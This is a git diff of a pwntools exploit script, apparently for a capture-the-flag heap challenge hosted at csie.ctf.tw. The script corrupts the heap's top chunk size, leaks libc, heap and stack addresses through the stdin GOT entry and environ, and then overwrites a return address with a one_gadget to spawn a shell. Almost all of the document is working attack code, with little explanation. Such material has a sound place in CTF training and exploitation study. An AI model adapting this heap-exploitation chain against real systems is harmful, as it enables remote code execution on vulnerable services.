@@ -2,17 +2,8 @@ from pwn import *
 
 context.arch='amd64'
 
-import sys
-if len(sys.argv) == 2:
-    if sys.argv[1] == 'local':
-        host = '127.0.0.1'
-        port = 8888
-    if sys.argv[1] == 'csie':
-        host = 'csie.ctf.tw'
-        port = 10141
-else:
-    print('Please tell me a server\'s name')
-    sys.exit()
+host = 'csie.ctf.tw'
+port = 10141
 
 r = remote(host, port)
 
@@ -41,32 +32,29 @@ def gen_new_top(new_top, data, old_top, old_top_size):
     new_top_size = old_top_size - (nb + 0x10) % 0x10000000000000000
     return new_top, new_top_size
 
-def overwrite_chunk_size():
-    allocate_heap(0x18, b'c'*0x18 + p64(0xffffffffffffffff))
-    r.recvuntil(':')
+def overwrite_top_to_ffffs():
+    allocate_heap(0x18, b'c'*0x18 + p64(0xffffffffffffffff), False)
 
 # leak top chunk address
-allocate_heap(0xc8, b'a'*0xc8 + p64(0xf31))
-r.recvuntil(':')
+allocate_heap(0x28, b'a'*0x28 + p64(0xfd1), False)
 allocate_heap(0x1000, b'a')
-allocate_heap(0x100, b'a'*0x10, False)
+allocate_heap(0x200, b'a'*0x10, False)
 show_heap()
 r.recvuntil('a'*0x10)
 heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
-# print('heap =', hex(heap))
-top = heap + (0x11d0010 - 0x11ae0d0)
-print('top =', hex(top))
+top = heap + (0x1e14010 - 0x1df2030)
+if top < 0x602030: # that means there is a null byte (0x00) inside the address of top chunk
+    top += 0x10000000
+# print('top =', hex(top))
 
 glibc_stdin_got = 0x602030
-glibc_stdin_off = 0x3c4861
-__malloc_hook_off = (0x7f4355058b10 - 0x7f4354c9407f)
+glibc_stdin_off = 0x3c48e0
 one_gadget_off = 0x45216
-# one_gadget_off = 0x4526a
-puts_off = 0x6f690
+environ_off = 0x7f3142bfaf38 - 0x7f3142834000
 
 # leak libc
-allocate_heap(0xe00-0x10, b'a')
-overwrite_chunk_size()
+allocate_heap(0xda0-0x10, b'a') # clean out unsorted bin so that we can modify top address
+overwrite_top_to_ffffs()
 top = top + 0x20
 gen_new_top(glibc_stdin_got - 0x10, b'a', top, 0xfffffffffffffff8)
 allocate_heap(0x10, b'a', False)
@@ -76,27 +64,25 @@ glibc_stdin = (glibc_stdin & 0xffffffffffffff00) + 0xe0
 libc = glibc_stdin - glibc_stdin_off
 
 # calculate addresses
-one_gadget = libc + one_gadget_off - 0x7f
-environ = libc + (0x7f4dd7484f38 - 0x7f4dd70be07f)
-puts = libc + puts_off - 0x7f
-print('libc          =', hex(libc))
-print('puts          =', hex(puts))
-print('one_gadget    =', hex(one_gadget))
-print('environ       =', hex(environ))
+one_gadget = libc + one_gadget_off
+environ = libc + environ_off
+# print('libc          =', hex(libc))
+# print('one_gadget    =', hex(one_gadget))
+# print('environ       =', hex(environ))
 
 # leak stack address by environ
-overwrite_chunk_size()
+overwrite_top_to_ffffs()
 gen_new_top(environ - 0x10, b'a', 0x602060, 0xfffffffffffffff8)
 allocate_heap(0x10, b'a'*8, False)
 show_heap()
 r.recvuntil(b'a'*8)
 stack = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
 allocate_heap_ret = stack + (0x7ffdacf6d138 - 0x7ffdacf6d268)
-print('stack         =', hex(stack))
-print('allocate_heap_ret =', hex(allocate_heap_ret))
+# print('stack         =', hex(stack))
+# print('allocate_heap_ret =', hex(allocate_heap_ret))
 
 # change allocate_heap return address
-overwrite_chunk_size()
+overwrite_top_to_ffffs()
 gen_new_top(allocate_heap_ret-0x8 - 0x10, b'a', environ+0x28, 0xfffffffffffffff8)
 allocate_heap(0x18, p64(allocate_heap_ret+0x18) + p64(one_gadget) + p64(0x400770) + p64(0x3c), False)
 
